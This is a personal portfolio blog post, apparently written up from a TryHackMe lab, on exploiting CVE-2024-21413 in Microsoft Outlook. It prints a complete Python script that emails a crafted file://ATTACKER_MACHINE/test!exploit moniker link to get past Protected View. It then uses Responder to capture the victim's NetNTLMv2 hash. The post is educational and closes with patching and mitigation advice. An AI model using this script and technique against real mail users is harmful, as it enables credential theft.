@@ -1,0 +1,400 @@
+<!doctype html>
+<html data-bs-theme="">
+    <head>
+                <title>Moniker Link (CVE-2024-21413) Exploit Write-Up - Paige Haines ✹ Portfolio</title>
+
+            <meta charset="utf-8">
+            <meta http-equiv="X-UA-Compatible" content="IE=edge">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+            
+            
+            
+
+            
+                <link  rel="icon" type="image/x-icon" href="../../../assets/favicon.png">
+            
+  
+            <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Mono:400,700">
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+            <link rel="stylesheet" href="../../../assets/css/bootstrap.min.css">
+            <link rel="stylesheet" href="../../../assets/css/root.min.css">
+            <link rel="stylesheet" href="../../../assets/css/main.min.css">
+            <link rel="stylesheet" href="../../../assets/css/media.min.css">
+            <link rel="stylesheet" href="../../../assets/css/mkdocstrings.min.css">
+                <link href="../../../css/extra.css" rel="stylesheet">
+                <link href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css" rel="stylesheet">
+                <link href="https://cdnjs.cloudflare.com/ajax/libs/pygments/2.15.1/styles/material.min.css" rel="stylesheet">
+                <script src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js"></script>
+                <script src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js"></script>
+                <script src="../../../js/katex.js"></script>
+                <script src="../../../search/main.js"></script>
+
+            
+                
+            
+  <link rel="stylesheet" href="../../../css/extra.css">
+
+    </head>
+
+    <body>
+        <div class="container py-3">
+            <header>
+                    <!-- block header -->
+<nav class="navbar navbar-expand-xl border-bottom">
+    <div class="container-fluid">
+        
+
+        
+            <span class=" fs-4 title-color site-name" id="component-site-name" style="text-transform: uppercase;">Paige Haines ✹ Portfolio</span>
+        
+
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarsMenu"
+            aria-controls="navbarsMenu" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse flex-column ml-auto" id="navbarsMenu">
+            <ul class="navbar-nav">
+
+                <!-- block menu -->
+                <li class="nav-item">
+                    <!-- block menu -->
+    
+        <li class="nav-item" id="component-menu">
+            <ul class="navbar-nav">
+                        <li class="nav-item">
+                            <a class="
+                            nav-link text-gray text-decoration-none" href="../../..">[Hi, I'm Paige! 👋]</a>
+                        </li>
+                        <li class="nav-item dropdown">
+                            <a class="
+                            nav-link dropdown-toggle text-decoration-none" href="#" data-bs-toggle="dropdown">[Blog]</a>
+                            <ul class="dropdown-menu">
+                                    <!-- block dropdown-menu -->
+    <li>
+        <a href="../../" class="dropdown-item text-decoration-none ">All Posts</a>
+    </li>
+<!-- endblock -->
+                            </ul>
+                        </li>
+                        <li class="nav-item dropdown">
+                            <a class="
+                            nav-link dropdown-toggle text-decoration-none" href="#" data-bs-toggle="dropdown">[Projects]</a>
+                            <ul class="dropdown-menu">
+                                    <!-- block dropdown-menu -->
+    <li>
+        <a href="../../../projectsoverview/" class="dropdown-item text-decoration-none ">All Projects</a>
+    </li>
+<!-- endblock -->
+                                    <!-- block dropdown-menu -->
+    <li>
+        <a href="../../../github/" class="dropdown-item text-decoration-none ">GitHub Projects</a>
+    </li>
+<!-- endblock -->
+                                    <!-- block dropdown-menu -->
+    <li>
+        <a href="../../../design/" class="dropdown-item text-decoration-none ">Design & Social Portfolio</a>
+    </li>
+<!-- endblock -->
+                            </ul>
+                        </li>
+                        <li class="nav-item">
+                            <a class="
+                            nav-link text-gray text-decoration-none" href="../../../teaching/">[Teaching]</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="
+                            nav-link text-gray text-decoration-none" href="../../../academia/">[Academia]</a>
+                        </li>
+                        <li class="nav-item dropdown">
+                            <a class="
+                            nav-link dropdown-toggle text-decoration-none" href="#" data-bs-toggle="dropdown">[Guides]</a>
+                            <ul class="dropdown-menu">
+                                    <!-- block dropdown-menu -->
+    <li>
+        <a href="../create-your-portfolio/" class="dropdown-item text-decoration-none ">GitHub Pages Guide</a>
+    </li>
+<!-- endblock -->
+                            </ul>
+                        </li>
+            </ul>
+        </li>
+<!-- endblock -->
+                </li>
+                <!-- endblock -->
+
+                <!-- block search -->
+                <li class="nav-item">
+                    <a class="collapsed" data-bs-toggle="collapse" href="#collapseExample" role="button" aria-expanded="false" aria-controls="collapseExample">
+                        <div class="md-search-icon">
+                            <i class="fa fa-search" aria-hidden="true"></i>
+                        </div>
+                    </a>
+                </li>
+                <!--  endblock -->
+
+                <!-- block source -->
+                <li class="nav-item">
+                    
+                </li>
+                <!--  endblock -->
+            </ul>
+        </div>
+    </div>
+</nav>
+<!--  endblock -->
+            </header>
+
+            <main><!-- block search -->
+<div class="collapse" id="collapseExample">
+    <div role="search" class="search-box">
+        <form id="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+            <input type="text" name="q" class="search-query"
+            placeholder="Search docs" title="Type search term here" />
+        </form>
+    </div>
+</div>
+<!-- endblock -->
+
+                
+                        <!-- block content -->
+<section class="container post" id="component-content">
+    <article>
+        <header>
+            
+                <h1 class=" title" id="component-title">Moniker Link (CVE-2024-21413) Exploit Write-Up</h1>
+            
+        </header>
+        <p><div style="text-align: center;">
+  <img src="/images/moniker-thumb.png" alt="Moniker Link Thumbnail" style="width: 100%; max-width: 500px; height: auto;">
+</div>
+
+<p><em>June 20, 2025</em></p>
+<h3 id="1-introduction">1. Introduction</h3>
+<p>This writeup comes from the TryHackMe <a href="https://tryhackme.com/room/monikerlink">Moniker Link (CVE-2024-21413)</a> room, where I demonstrate how to exploit a machine with the CVE-2024-21413 vulnerability.</p>
+<p>This vulnerability has been noted alongside the following details:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Field</strong></th>
+<th><strong>Details</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>CNA</strong></td>
+<td>Microsoft Corporation</td>
+</tr>
+<tr>
+<td><strong>Published</strong></td>
+<td>2024-02-13</td>
+</tr>
+<tr>
+<td><strong>Updated</strong></td>
+<td>2025-05-03</td>
+</tr>
+<tr>
+<td><strong>Title</strong></td>
+<td>Microsoft Outlook Remote Code Execution Vulnerability</td>
+</tr>
+<tr>
+<td><strong>Description</strong></td>
+<td>Microsoft Outlook Remote Code Execution Vulnerability</td>
+</tr>
+<tr>
+<td><strong>CWE ID</strong></td>
+<td>CWE-20: Improper Input Validation</td>
+</tr>
+<tr>
+<td><strong>CVSS Score</strong></td>
+<td>9.8 (CRITICAL)</td>
+</tr>
+<tr>
+<td><strong>CVSS Vector</strong></td>
+<td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C</code></td>
+</tr>
+<tr>
+<td><strong>Affected Products</strong></td>
+<td>- <strong>Microsoft Office 2019</strong> on 32-bit and x64 systems: from 19.0.0 before <a href="https://aka.ms/OfficeSecurityReleases">Security Releases</a>  <br> - <strong>Microsoft 365 Apps for Enterprise</strong> on 32-bit and x64 systems: from 16.0.1 before <a href="https://aka.ms/OfficeSecurityReleases">Security Releases</a> <br> - <strong>Microsoft Office LTSC 2021</strong> on 32-bit and x64 systems: from 16.0.1 before <a href="https://aka.ms/OfficeSecurityReleases">Security Releases</a> <br> - <strong>Microsoft Office 2016</strong> on 32-bit and x64 systems: from 16.0.0 before 16.0.5435.1001</td>
+</tr>
+</tbody>
+</table>
+<p>Outlook renders its emails using Hyper Text Markup Language (HTML), which is a standard language for structuring and displaying content. This ensures that Outlook is able to interpret and display HTML elements, including hyperlinks that use protocols including HTTP and HTTPs. With this, another mechanism is able to be parsed by Outlook, and this mechanism is known as a <strong>Moniker Link</strong>.  </p>
+<p>These are unique URLs that leverage Windows COM (Component Object Model) monikers, where objects are used to dynamically reference resources or invoke unwelcome actions. When these links are embedded in emails, they can be created in such a way that invoke local or remote resources in malicious ways. In the vulnerable version of Outlook that I will be using in this demonstration, a Moniker Link can be exploited to trigger the automatic loading of malicious content, potentially leading to Remote Code Execution (RCE) without user interaction. </p>
+<p>Outlook does implement a security feature that prompts a message when external applications are triggered, and is called <strong>Protected View</strong>. This feature opens emails that contain items such as attachments, hyperlinks, or similar type of content in read-only mode. This allows Outlook to block actions such as macros.</p>
+<p>In this walkthrough, I will be using <code>file://</code> as the Moniker Link in the malicious hyperlink. As Outlook will block the typical Moniker Link<br />
+<code>&lt;p&gt;&lt;a href="file://ATTACKER_MACHINE/test"&gt;Click me&lt;/a&gt;&lt;/p&gt;</code>, I will instead adjust the link to include an <strong>exclamation mark</strong>, which is a special character that can bypass Outlook's Protected View. When updated, the Moniker Link becomes<br />
+<code>&lt;p&gt;&lt;a href="file://ATTACKER_MACHINE/test!exploit"&gt;Click me&lt;/a&gt;&lt;/p&gt;</code>. Notice the placement of the special character.</p>
+<h4 id="11-scope">1.1 Scope</h4>
+<p>• Creation of Exploit Python File<br />
+• Setting Up the Attack<br />
+• Executing the Exploit  </p>
+<h3 id="2-creation-of-exploit-python-file">2. Creation of Exploit Python File</h3>
+<h4 id="tools-used">Tools Used</h4>
+<p>• <strong>nano</strong>: a tool that is used to edit files and scripts from the terminal</p>
+<p>This investigation start with the use of a victim machine and an attacker machine. A script titled <code>exploit.py</code> was created, as provided by TryHackMe. 
+<pre class="highlight"><code>'''
+Author: CMNatic | https://github.com/cmnatic
+Version: 1.0 | 19/02/2024
+'''
+
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.utils import formataddr
+
+sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
+receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
+password = input("Enter your attacker email password: ")
+html_content = """\
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+    &lt;p&gt;&lt;a href="file://ATTACKER_MACHINE/test!exploit"&gt;Click me&lt;/a&gt;&lt;/p&gt;
+
+    &lt;/body&gt;
+&lt;/html&gt;"""
+
+message = MIMEMultipart()
+message['Subject'] = "CVE-2024-21413"
+message["From"] = formataddr(('CMNatic', sender_email))
+message["To"] = receiver_email
+
+# Convert the HTML string into bytes and attach it to the message object
+msgHtml = MIMEText(html_content,'html')
+message.attach(msgHtml)
+
+server = smtplib.SMTP('MAILSERVER', 25)
+server.ehlo()
+try:
+    server.login(sender_email, password)
+except Exception as err:
+    print(err)
+    exit(-1)
+
+try:
+    server.sendmail(sender_email, [receiver_email], message.as_string())
+    print("\n Email delivered")
+except Exception as error:
+    print(error)
+finally:
+    server.quit()</code></pre></p>
+<p>It is important to adjust the <code>ATTACKER_MACHINE</code> and <code>MAILSERVER</code>. In this investigation, I replaced <code>ATTACKER_MACHINE</code> with my attacker IP address <strong>10.10.90.151</strong>, and <code>MAILSERVER</code> with the server IP address generated by TryHackMe, <strong>10.10.46.81</strong>.</p>
+<p>Once edited, I input the command <code>nano exploit.py</code>.</p>
+<div style="text-align: center;">
+    <img src="../../posts/images/moniker-1.png" alt="Moniker Link Writeup" style="width: 100%; max-width: 600px; height: auto;"> 
+</div>
+
+<p>In this new panel, I pasted the updated script. After this was completed, I saved this to the machine, ready for exploitation!</p>
+<div style="text-align: center;">
+    <img src="../../posts/images/moniker-2.png" alt="Moniker Link Writeup" style="width: 100%; max-width: 600px; height: auto;"> 
+</div>
+
+<h3 id="3-setting-up-the-attack">3. Setting Up the Attack</h3>
+<h4 id="tools-used_1">Tools Used</h4>
+<p>• <strong>responder</strong>: a tool that can be used to capture and manipulate network authentication protocols<br />
+• <strong>Outlook</strong>: an email application that allows a user to receive and send emails  </p>
+<p>To execute this exploit, the victim machine runs a vulnerable version of Outlook. </p>
+<div style="text-align: center;">
+    <img src="../../posts/images/moniker-3.png" alt="Moniker Link Writeup" style="width: 100%; max-width: 1000px; height: auto;"> 
+</div>
+
+<p>I ran the responder tool utilising the command <code>responder -I ens5</code>. Responder will be used in this investigation as it can be used to networking poisoning attacks, enabling it to harvest credentials. <code>-I ens5</code> denotes the network interfact to listen from, which is <strong>ens5</strong> in my case. </p>
+<div style="text-align: center;">
+    <img src="../../posts/images/moniker-4.png" alt="Moniker Link Writeup" style="width: 100%; max-width: 700px; height: auto;"> 
+</div>
+
+<h3 id="4-executing-the-attack">4. Executing the Attack</h3>
+<h4 id="tools-used_2">Tools Used</h4>
+<p>• <strong>Outlook</strong><br />
+• <strong>exploit.py</strong>  </p>
+<p>In a new terminal, I executed my exploit script using the command <code>python3 exploit.py</code>. When requested, I provided the password of the attacking email as per TryHackMe's website which is <code>attacker</code>. I can see that this has been successful, as the program prints the message <code>Email delivered</code>.</p>
+<div style="text-align: center;">
+    <img src="../../posts/images/moniker-5.png" alt="Moniker Link Writeup" style="width: 100%; max-width: 600px; height: auto;"> 
+</div>
+
+<p>Viewing this email in the victim machine, they have received a suspicious email with a link that says <strong>Click me</strong>. When clicked, an error is shown. </p>
+<div style="text-align: center;">
+    <img src="../../posts/images/moniker-6.png" alt="Moniker Link Writeup" style="width: 100%; max-width: 700px; height: auto;"> 
+</div>
+
+<p>Reviewing the responder results in the attacker machine, I am now able to observe the sensitive netNTLMv2 password hash of the victim. </p>
+<div style="text-align: center;">
+    <img src="../../posts/images/moniker-7.png" alt="Moniker Link Writeup" style="width: 100%; max-width: 700px; height: auto;"> 
+</div>
+
+<h3 id="5-conclusion">5. Conclusion</h3>
+<p>In this demonstration, I highlight how an attacker may exploit <strong>CVE-2024-21413</strong> by crafting an email which contains a <strong>moniker link</strong> to obtain the users <strong>NTMLv2</strong> password hash from a vulnerable Outlook client. A python-based script is used alongside <strong>responder</strong> to listen for authentication attempts. In this simulation, the victim has been successfully tricked into initiating a connection with the malicious file path, which subsequently triggers automatic credential harvesting. The underlying behaviour in this version of Outlook, which is rendering and attempting to access the embedded <code>file://</code> was sufficient to leak the users authentication data to my AttackBox. This demonstrates the inherent risk in client-sidew parsing of these types of crafted links and foregrounds the importance of security updates and disabling link resolution in email clients. In this controlled environment, this writeup has thoroughly illustrated how even with minimal user interaction, credentials can still be compromised and stolen. Reflecting on methods to mitigate these types of attacks, users can implement more secure configurations within email clients, and ensuring proactive patch management to effectively protect against vulnerabilities such as CVE-2024-21413.</p></p>
+    </article>
+</section>
+<!-- endblock -->
+                
+                
+            </main>
+
+            
+                    <!-- block preview -->
+<!-- endblock -->
+            
+
+            
+<footer class="md-footer">
+  <div class="md-footer-meta">
+    <div class="md-footer-meta__inner">
+      <p>© 2025 Paige Haines. All rights reserved.</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+  const copyIcon = `
+<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="28" height="28" viewBox="0 0 24 24" stroke-width="1" stroke="#173CB6" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <title>Copy to clipboard</title>
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+  <rect x="8" y="8" width="12" height="12" rx="2"></rect>
+  <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path>
+</svg>`;
+
+  document.querySelectorAll('pre').forEach((pre) => {
+    const button = document.createElement('button');
+    button.className = 'copy-btn';
+    button.type = 'button';
+    button.setAttribute('aria-label', 'Copy code to clipboard');
+    button.innerHTML = copyIcon;
+
+    pre.appendChild(button);
+
+    button.addEventListener('click', () => {
+      const code = pre.querySelector('code');
+      if (!code) return;
+
+      navigator.clipboard.writeText(code.innerText).then(() => {
+        button.classList.add('copied');
+        button.innerHTML = '✔ Copied';
+        setTimeout(() => {
+          button.classList.remove('copied');
+          button.innerHTML = copyIcon;
+        }, 2500);
+      });
+    });
+  });
+});
+</script>
+
+            
+        </div>
+
+            <script>var base_url = '../../..';</script>
+            <script src="../../../assets/js/jquery-3.3.1.slim.min.js""></script>
+            <script src="../../../assets/js/bootstrap.bundle.min.js""></script>
+            <script src="../../../assets/js/main.min.js""></script>
+                <script src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js" defer></script>
+                <script src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js" defer></script>
+                <script src="../../../js/katex.js" defer></script>
+                <script src="../../../search/main.js" defer></script>
+
+    </body>
+
+</html>
